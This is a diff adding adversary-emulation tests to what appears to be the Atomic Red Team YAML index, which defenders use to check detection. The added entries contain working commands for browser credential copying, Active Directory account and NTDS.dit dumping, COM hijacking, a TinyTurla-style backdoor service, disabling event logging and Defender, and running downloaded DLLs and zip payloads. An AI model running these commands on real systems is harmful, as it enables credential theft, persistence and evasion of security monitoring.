@@ -1558,11 +1558,46 @@ credential-access:
       executor:
         name: powershell
         command: 'Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\" -Destination
-          $env:temp -Force
+          $env:temp -Force -Recurse
 
 '
-        cleanup_command: Remove-Item -Path "$env:temp\Profiles" -Force -ErrorAction
-          Ig
+        cleanup_command: 'Remove-Item -Path "$env:temp\Profiles" -Force -ErrorAction
+          Ignore -Recurse
+
+'
+    - name: Simulating access to Windows Edge Login Data
+      auto_generated_guid: a6a5ec26-a2d1-4109-9d35-58b867689329
+      description: |
+        Simulates an adversary accessing encrypted credentials from Edge web browser's login database.
+        more info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Edge must be installed
+
+'
+        prereq_command: if (Test-Path "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")
+          {exit 0} else {exit 1}
+        get_prereq_command: '"Installation is not implemented as Edge is a part of
+          windows"
+
+'
+      - description: 'Edge login data file must exist
+
+'
+        prereq_command: if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default")
+          {exit 0} else {exit 1}
+        get_prereq_command: "$edge=\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"\nStart-Process
+          $edge \nStart-Sleep -s 20\nStop-Process -Name msedge\n"
+      executor:
+        name: powershell
+        command: 'Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination
+          $env:temp\Edge -Force -Recurse
+
+'
+        cleanup_command: Remove-Item -Path "$env:temp\Edge" -Force -ErrorAction Ignore
+          -Recurse
   T1552.002:
     technique:
       created: '2020-02-04T12:58:40.678Z'
@@ -1773,6 +1808,36 @@ credential-access:
           "exit"
 
 '
+    - name: Run DSInternals Get-ADReplAccount
+      auto_generated_guid: a0bced08-3fc5-4d8b-93b7-e8344739376e
+      description: "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon
+        successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/)
+        CrowdStrike StellerParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        logonserver:
+          description: ComputerName argument default %logonserver%
+          type: String
+          default: $ENV:logonserver.TrimStart("\")
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'DSInternals must be installed
+
+'
+        prereq_command: |
+          $RequiredModule = Get-Module -Name DSInternals -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name DSInternals -Scope CurrentUser -Force
+
+'
+      executor:
+        command: 'Get-ADReplAccount -All -Server #{logonserver}
+
+'
+        name: powershell
+        elevation_required: false
   T1556.001:
     technique:
       external_references:
@@ -4335,6 +4400,45 @@ credential-access:
 '
       executor:
         command: 'wmic /node:"#{target_host}" shadowcopy call create Volume=#{drive_letter}
+
+'
+        name: command_prompt
+        elevation_required: true
+    - name: Create Volume Shadow Copy remotely (WMI) with esentutl
+      auto_generated_guid: 21c7bf80-3e8b-40fa-8f9d-f5b194ff2865
+      description: |
+        This test is intended to be run from a remote workstation with domain admin context.
+        The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.
+      supported_platforms:
+      - windows
+      input_arguments:
+        source_path:
+          description: File to shadow copy
+          type: String
+          default: c:\windows\ntds\ntds.dit
+        target_path:
+          description: Target path of the result file
+          type: String
+          default: c:\ntds.dit
+        target_host:
+          description: IP Address / Hostname you want to target
+          type: String
+          default: localhost
+      dependencies:
+      - description: 'Target must be a reachable Domain Controller, and current context
+          must be domain admin
+
+'
+        prereq_command: 'wmic /node:"#{target_host}" shadowcopy list brief
+
+'
+        get_prereq_command: 'echo Sorry, can''t connect to target host, check: network,
+          firewall or permissions (must be admin on target)
+
+'
+      executor:
+        command: 'wmic /node:"#{target_host}" process call create "cmd.exe /c esentutl.exe
+          /y /vss #{source_path} /d #{target_path}"
 
 '
         name: command_prompt
@@ -12608,7 +12712,48 @@ privilege-escalation:
       - Elastic
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1546.015
+    atomic_tests:
+    - name: COM Hijacking - InprocServer32
+      auto_generated_guid: 48117158-d7be-441b-bc6a-d9e36e47b52b
+      description: |-
+        This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.
+
+        Reference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/
+      supported_platforms:
+      - windows
+      input_arguments:
+        clsid_threading:
+          description: Threading Model
+          type: string
+          default: Apartment
+        dllpath:
+          description: Path to the DLL.
+          type: String
+          default: "$env:TEMP\\AtomicTest.dll"
+        clsid:
+          description: Class ID to hijack.
+          type: string
+          default: "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
+        clsid_description:
+          description: Description for CLSID
+          type: string
+          default: MSAA AccPropServices
+      dependency_executor_name: powershell
+      dependencies:
+      - description: DLL For testing
+        prereq_command: 'if (Test-Path #{dllpath}) {exit 0} else {exit 1}'
+        get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll"
+          -OutFile "#{dllpath}"
+      executor:
+        command: |-
+          New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
+          New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value #{dllpath}
+          New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
+          Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
+        cleanup_command: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}'
+          -Recurse -ErrorAction Ignore
+        name: powershell
   T1053.007:
     technique:
       external_references:
@@ -20485,6 +20630,36 @@ privilege-escalation:
           Stop-Service -Name "#{service_name}" 2>&1 | Out-Null
           try {(Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()}
           catch {}
+    - name: TinyTurla backdoor service w64time
+      auto_generated_guid: ef0581fd-528e-4662-87bc-4c2affb86940
+      description: |
+        It's running Dll as service to emulate the tine turla backdoor
+
+        [Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)
+      supported_platforms:
+      - windows
+      input_arguments:
+        dllfilename:
+          description: It specifies Dll file to run as service
+          type: string
+          default: "$PathToAtomicsFolder\\T1543.003\\bin\\w64time.dll"
+      executor:
+        command: |-
+          copy #{dllfilename} %systemroot%\system32\
+          sc create W64Time binPath= "c:\Windows\System32\svchost.exe -k TimeService" type= share start=auto
+          sc config W64Time DisplayName= "Windows 64 Time"
+          sc description W64Time "Maintain date and time synch on all clients and services in the network"
+          reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f
+          reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%systemroot%\system32\w64time.dll" /f
+          sc start W64Time
+        cleanup_command: |-
+          sc stop W64Time
+          sc.exe delete W64Time
+          del %systemroot%\system32\w64time.dll
+          reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /f
+          reg delete "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /f
+        name: command_prompt
+        elevation_required: true
   T1547.004:
     technique:
       created: '2020-01-24T16:59:59.688Z'
@@ -24964,6 +25139,37 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: Makes Eventlog blind with Phant0m
+      auto_generated_guid: 3ddf3d03-f5d6-462a-ad76-2c5ff7b6d741
+      description: 'Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_name:
+          description: exe version of Phant0m
+          type: Path
+          default: PathToAtomicsFolder\T1562.002\bin\Phant0m.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Phant0m.exe must exist on disk at specified location (#{file_name})
+
+'
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1562.002/bin/Phant0m.exe" -OutFile "#{file_name}" -UseBasicParsing
+      executor:
+        command: 'PathToAtomicsFolder\T1562.002\bin\Phant0m.exe
+
+'
+        cleanup_command: 'echo "Sorry you have to reboot"
+
+'
+        name: command_prompt
   T1562.007:
     technique:
       external_references:
@@ -26059,6 +26265,45 @@ defense-evasion:
         command: Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove
           /NoRestart /quiet
         name: command_prompt
+        elevation_required: true
+    - name: Disable Defender with Defender Control
+      auto_generated_guid: 178136d8-2778-4d7a-81f3-d517053a4fd6
+      description: "Attempting to use Defender Control software to disable Windows
+        Defender. Upon successful execution, Windows Defender will be turned off.
+        \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        DefenderID:
+          description: Defender ID that is used as a sort of passcode to disable it
+            within Defender Control from the command line. The machine-specific Defender
+            ID can be obtained within Defender Control by going to menu, command line
+            info, and then retrieving the 4 character passcode to continue (listed
+            after defendercontrol /d /id in the command line info window).
+          type: String
+          default: FFFF
+        DefenderControlExe:
+          description: Path to Defender Control software version 1.6.
+          type: String
+          default: "$env:temp\\DefenderControl\\DefenderControl\\DefenderControl.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: "Defender Control must be installed on the machine. \n"
+        prereq_command: 'if (Test-Path #{DefenderControlExe}) {exit 0} else {exit
+          1}
+
+'
+        get_prereq_command: |
+          Start-BitsTransfer -Source "https://web.archive.org/web/20201210152711/https://www.sordum.org/files/download/defender-control/DefenderControl.zip" -Destination "$env:temp\defendercontrol.zip" -dynamic
+          expand-archive -LiteralPath "$env:temp\defendercontrol.zip" -DestinationPath "$env:temp\DefenderControl"
+      executor:
+        command: 'cmd /c #{DefenderControlExe} /D #{DefenderID} | Out-Null
+
+'
+        cleanup_command: 'cmd /c #{DefenderControlExe} /E | Out-Null
+
+'
+        name: powershell
         elevation_required: true
   T1078.002:
     technique:
@@ -30775,6 +31020,37 @@ defense-evasion:
           start %ALLUSERSPROFILE%\cmd.exe
         cleanup_command: del %ALLUSERSPROFILE%\cmd.exe >nul 2>&1
         name: command_prompt
+    - name: Malware Masquerading and Execution from Zip File
+      auto_generated_guid: 4449c89b-ec82-43a4-89c1-91e2f1abeecc
+      description: When the file is unzipped and the README.cmd file opened, it executes
+        and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique
+        [as reported here](https://twitter.com/ffforward/status/1481672378639912960)
+      supported_platforms:
+      - windows
+      input_arguments:
+        url:
+          description: Location of zip file
+          type: Url
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip
+      dependencies:
+      - description: Zip file must be present.
+        prereq_command: 'if (Test-Path $env:userprofile\Downloads\T1036.zip) {exit
+          0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest -OutFile "$env:userprofile\Downloads\T1036.zip"
+          #{url}
+
+'
+      executor:
+        command: |-
+          Expand-Archive -Path $env:userprofile\Downloads\T1036.zip -DestinationPath $env:userprofile\Downloads\T1036 -Force
+          cd $env:userprofile\Downloads\T1036
+          cmd /c $env:userprofile\Downloads\T1036\README.cmd >$null 2>$null
+        cleanup_command: |-
+          taskkill /IM Calculator.exe /f >$null 2>$null
+          Remove-Item $env:userprofile\Downloads\T1036 -recurse -ErrorAction Ignore
+        name: powershell
   T1036.005:
     technique:
       id: attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2
@@ -36174,6 +36450,98 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: Execution of non-dll using rundll32.exe
+      auto_generated_guid: ae3a8605-b26e-457c-b6b3-2702fd335bac
+      description: "Rundll32.exe running non-dll \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        input_url:
+          description: Url to download the DLL
+          type: Url
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+        input_file:
+          description: Non-dll file
+          type: String
+          default: C:\Users\$env:username\Downloads\calc.png
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Non-dll file must exist on disk at specified location
+
+'
+        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+
+'
+      executor:
+        name: powershell
+        command: 'rundll32.exe #{input_file}, StartW
+
+'
+    - name: Rundll32 with Ordinal Value
+      auto_generated_guid: 9fd5a74b-ba89-482a-8a3e-a5feaa3697b0
+      description: "Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer.
+        \nUpon successful execution, Calc.exe will spawn.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        input_url:
+          description: Url to download the DLL
+          type: Url
+          default: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/bin/AllTheThingsx64.dll
+        input_file:
+          description: DLL File
+          type: String
+          default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx64.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'DLL file must exist on disk at specified location
+
+'
+        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+
+'
+      executor:
+        name: command_prompt
+        command: 'rundll32.exe #{input_file},#2
+
+'
+    - name: Rundll32 with Control_RunDLL
+      auto_generated_guid: e4c04b6f-c492-4782-82c7-3bf75eb8077e
+      description: "Rundll32.exe loading dll with 'control_rundll' within the command-line,
+        loading a .cpl or another file type related to CVE-2021-40444. \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        input_url:
+          description: Url to download the DLL
+          type: Url
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+        input_file:
+          description: DLL File
+          type: String
+          default: PathToAtomicsFolder\T1047\bin\calc.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'DLL file must exist on disk at specified location
+
+'
+        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+
+'
+      executor:
+        name: command_prompt
+        command: 'rundll32.exe shell32.dll,Control_RunDLL #{input_file}
+
+'
   T1134.005:
     technique:
       external_references:
@@ -40199,6 +40567,300 @@ persistence:
           aws iam remove-user-from-group --user-name #{username} --group-name #{username}
           aws iam delete-group --group-name #{username}
         name: sh
+    - name: Azure - adding user to Azure AD role
+      auto_generated_guid: 0e65ae27-5385-46b4-98ac-607a8ee82261
+      description: "The adversarie want to add user to some Azure AD role. Threat
+        actor \nmay be interested primarily in highly privileged roles, e.g. Global
+        Administrator, Application Administrator, \nPrivileged authentication administrator
+        (this role can reset Global Administrator password!).\nBy default, the role
+        Global Reader is assigned to service principal in this test.\n\nThe account
+        you use to run the PowerShell command should have Privileged Role Administrator
+        or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity
+        \"Add member to role\" in Azure AD Audit Logs. In targer you will also see
+        User as a type.\n"
+      supported_platforms:
+      - azure-ad
+      input_arguments:
+        username:
+          description: Azure AD username
+          type: String
+          default: jonh@contoso.com
+        password:
+          description: Azure AD password
+          type: String
+          default: p4sswd
+        user_principal_name:
+          description: Name of the targeted user (user principal)
+          type: String
+          default: SuperUser
+        role_name:
+          description: Name of the targed Azure AD role
+          type: String
+          default: Global Reader
+      dependencies:
+      - description: 'AzureAD module must be installed.
+
+'
+        prereq_command: 'try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue)
+          {exit 0} else {exit 1}} catch {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AzureAD -Force
+
+'
+      executor:
+        command: |
+          Import-Module -Name AzureAD
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+          Connect-AzureAD -Credential $Credential
+
+          $user = Get-AzureADUser | where-object {$_.DisplayName -eq "#{user_principal_name}"}
+          if ($user -eq $null) { Write-Warning "User not found"; exit }
+          $role = Get-AzureADDirectoryRole | where-object {$_.DisplayName -eq "#{role_name}"}
+          if ($role -eq $null) { Write-Warning "Role not found"; exit }
+          Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId
+          Write-Host "User $($user.DisplayName) was added to $($role.DisplayName) role"
+        cleanup_command: |
+          Import-Module -Name AzureAD -ErrorAction Ignore
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+          Connect-AzureAD -Credential $Credential -ErrorAction Ignore
+
+          $user = Get-AzureADUser | where-object {$_.DisplayName -eq "#{user_principal_name}"}
+          if ($user -eq $null) { Write-Warning "User not found"; exit }
+          $role = Get-AzureADDirectoryRole | where-object {$_.DisplayName -eq "#{role_name}"}
+          if ($role -eq $null) { Write-Warning "Role not found"; exit }
+
+          Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $user.ObjectId
+          Write-Host "User $($user.DisplayName) was removed from $($role.DisplayName) role"
+        name: powershell
+        elevation_required: false
+    - name: Azure - adding service principal to Azure AD role
+      auto_generated_guid: 92c40b3f-c406-4d1f-8d2b-c039bf5009e4
+      description: "The adversarie want to add service principal to some Azure AD
+        role. Threat actor \nmay be interested primarily in highly privileged roles,
+        e.g. Global Administrator, Application Administrator, \nPrivileged authentication
+        administrator (this role can reset Global Administrator password!).\nBy default,
+        the role Global Reader is assigned to service principal in this test.\n\nThe
+        account you use to run the PowerShell command should have Privileged Role
+        Administrator or Global Administrator role in your Azure AD.\n\nDetection
+        hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer
+        you will also see Service Principal as a type.\n"
+      supported_platforms:
+      - azure-ad
+      input_arguments:
+        username:
+          description: Azure AD username
+          type: String
+          default: jonh@contoso.com
+        password:
+          description: Azure AD password
+          type: String
+          default: p4sswd
+        service_principal_name:
+          description: Name of the service principal
+          type: String
+          default: SuperSP
+        role_name:
+          description: Name of the targed Azure AD role
+          type: String
+          default: Global Reader
+      dependencies:
+      - description: 'AzureAD module must be installed.
+
+'
+        prereq_command: 'try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue)
+          {exit 0} else {exit 1}} catch {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AzureAD -Force
+
+'
+      executor:
+        command: |
+          Import-Module -Name AzureAD
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+          Connect-AzureAD -Credential $Credential
+
+          $sp = Get-AzureADServicePrincipal | where-object {$_.DisplayName -eq "#{service_principal_name}"}
+          if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
+          $role = Get-AzureADDirectoryRole | where-object {$_.DisplayName -eq "#{role_name}"}
+          if ($role -eq $null) { Write-Warning "Role not found"; exit }
+          Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId
+          Write-Host "Service Principal $($sp.DisplayName) was added to $($role.DisplayName)"
+        cleanup_command: |
+          Import-Module -Name AzureAD -ErrorAction Ignore
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+          Connect-AzureAD -Credential $Credential -ErrorAction Ignore
+
+          $sp = Get-AzureADServicePrincipal | where-object {$_.DisplayName -eq "#{service_principal_name}"}
+          if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
+          $role = Get-AzureADDirectoryRole | where-object {$_.DisplayName -eq "#{role_name}"}
+          if ($role -eq $null) { Write-Warning "Role not found"; exit }
+
+          Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $sp.ObjectId
+          Write-Host "Service Principal $($sp.DisplayName) was removed from $($role.DisplayName) role"
+        name: powershell
+        elevation_required: false
+    - name: Azure - adding user to Azure role in subscription
+      auto_generated_guid: 1a94b3fc-b080-450a-b3d8-6d9b57b472ea
+      description: "The adversarie want to add user to some Azure role, also called
+        Azure resource role. Threat actor \nmay be interested primarily in highly
+        privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is
+        assigned to user in this test.\n\nNew-AzRoleAssignment cmdlet could be also
+        use to assign user/service principal to resource, resource group and management
+        group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write
+        \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory
+        Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection
+        hint - check Operation Name \"Create role assignment\" in subscriptions Activity
+        Logs.\n"
+      supported_platforms:
+      - iaas:azure
+      input_arguments:
+        username:
+          description: Azure AD username
+          type: String
+          default: jonh@contoso.com
+        password:
+          description: Azure AD password
+          type: String
+          default: p4sswd
+        user_principal_name:
+          description: Name of the targeted user (user principal)
+          type: String
+          default: SuperUser
+        role_name:
+          description: Name of the targed Azure role
+          type: String
+          default: Reader
+        subscription:
+          description: Name of the targed subscription
+          type: String
+          default: Azure subscription 1
+      dependencies:
+      - description: 'Az.Resources module must be installed.
+
+'
+        prereq_command: 'try {if (Get-InstalledModule -Name Az.Resources -ErrorAction
+          SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name Az.Resources -Force
+
+'
+      executor:
+        command: |
+          Import-Module -Name Az.Resources
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+          Connect-AzAccount -Credential $Credential
+
+          $user = Get-AzADUser | where-object {$_.DisplayName -eq "#{user_principal_name}"}
+          if ($user -eq $null) { Write-Warning "User not found"; exit }
+          $subscription = Get-AzSubscription | where-object {$_.Name -eq "#{subscription}"}
+          if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }
+          $role = Get-AzRoleDefinition | where-object {$_.Name -eq "#{role_name}"}
+          if ($role -eq $null) { Write-Warning "Role not found"; exit }
+
+          New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
+          Write-Host "User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)"
+        cleanup_command: |
+          Import-Module -Name AzureAD -ErrorAction Ignore
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+          Connect-AzAccount -Credential $Credential -ErrorAction Ignore
+
+          $user = Get-AzADUser | where-object {$_.DisplayName -eq "#{user_principal_name}"}
+          if ($user -eq $null) { Write-Warning "User not found"; exit }
+          $subscription = Get-AzSubscription | where-object {$_.Name -eq "#{subscription}"}
+          if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }
+          $role = Get-AzRoleDefinition | where-object {$_.Name -eq "#{role_name}"}
+          if ($role -eq $null) { Write-Warning "Role not found"; exit }
+
+          Remove-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
+          Write-Host "Service Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)"
+        name: powershell
+        elevation_required: false
+    - name: Azure - adding service principal to Azure role in subscription
+      auto_generated_guid: c8f4bc29-a151-48da-b3be-4680af56f404
+      description: "The adversarie want to add service principal to some Azure role,
+        also called Azure resource role. Threat actor \nmay be interested primarily
+        in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role
+        Reader is assigned to service principal in this test.\n\nNew-AzRoleAssignment
+        cmdlet could be also use to assign user/service principal to resource, resource
+        group and management group.\n\nThe account you use to run the PowerShell command
+        must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User
+        Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All
+        \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint -
+        check Operation Name \"Create role assignment\" in subscriptions Activity
+        Logs.\n"
+      supported_platforms:
+      - iaas:azure
+      input_arguments:
+        username:
+          description: Azure AD username
+          type: String
+          default: jonh@contoso.com
+        password:
+          description: Azure AD password
+          type: String
+          default: p4sswd
+        service_principal_name:
+          description: Name of the service principal
+          type: String
+          default: SuperSP
+        role_name:
+          description: Name of the targed Azure role
+          type: String
+          default: Reader
+        subscription:
+          description: Name of the targed subscription
+          type: String
+          default: Azure subscription 1
+      dependencies:
+      - description: 'Az.Resources module must be installed.
+
+'
+        prereq_command: 'try {if (Get-InstalledModule -Name Az.Resources -ErrorAction
+          SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name Az.Resources -Force
+
+'
+      executor:
+        command: "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString
+          -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName
+          System.Management.Automation.PSCredential -ArgumentList \"#{username}\",
+          $Pword\nConnect-AzAccount -Credential $Credential\n\n$sp = Get-AzADServicePrincipal
+          | where-object {$_.DisplayName -eq \"#{service_principal_name}\"}\nif ($sp
+          -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$subscription
+          = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"} \nif
+          ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit
+          }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif
+          ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nNew-AzRoleAssignment
+          -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host
+          \"Service Principal $($sp.DisplayName) was added to $($role.Name) role in
+          subscriptions $($subscriptions.Name)\"\n"
+        cleanup_command: "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord
+          = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential
+          = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList
+          \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential -ErrorAction
+          Ignore\n\n$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName
+          -eq \"#{service_principal_name}\"}\nif ($sp -eq $null) { Write-Warning \"Service
+          Principal not found\"; exit }\n$subscription = Get-AzSubscription | where-object
+          {$_.Name -eq \"#{subscription}\"} \nif ($subscription -eq $null) { Write-Warning
+          \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object
+          {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role
+          not found\"; exit }\n\nRemove-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId
+          $role.id -Scope /subscriptions/$subscription\nWrite-Host \"Service Principal
+          $($sp.DisplayName) was removed from $($role.Name) role in subscriptions
+          $($subscriptions.Name)\"\n"
+        name: powershell
+        elevation_required: false
   T1547.014:
     technique:
       external_references:
@@ -42538,7 +43200,48 @@ persistence:
       - Elastic
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1546.015
+    atomic_tests:
+    - name: COM Hijacking - InprocServer32
+      auto_generated_guid: 48117158-d7be-441b-bc6a-d9e36e47b52b
+      description: |-
+        This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.
+
+        Reference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/
+      supported_platforms:
+      - windows
+      input_arguments:
+        clsid_threading:
+          description: Threading Model
+          type: string
+          default: Apartment
+        dllpath:
+          description: Path to the DLL.
+          type: String
+          default: "$env:TEMP\\AtomicTest.dll"
+        clsid:
+          description: Class ID to hijack.
+          type: string
+          default: "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
+        clsid_description:
+          description: Description for CLSID
+          type: string
+          default: MSAA AccPropServices
+      dependency_executor_name: powershell
+      dependencies:
+      - description: DLL For testing
+        prereq_command: 'if (Test-Path #{dllpath}) {exit 0} else {exit 1}'
+        get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll"
+          -OutFile "#{dllpath}"
+      executor:
+        command: |-
+          New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
+          New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value #{dllpath}
+          New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
+          Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
+        cleanup_command: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}'
+          -Recurse -ErrorAction Ignore
+        name: powershell
   T1554:
     technique:
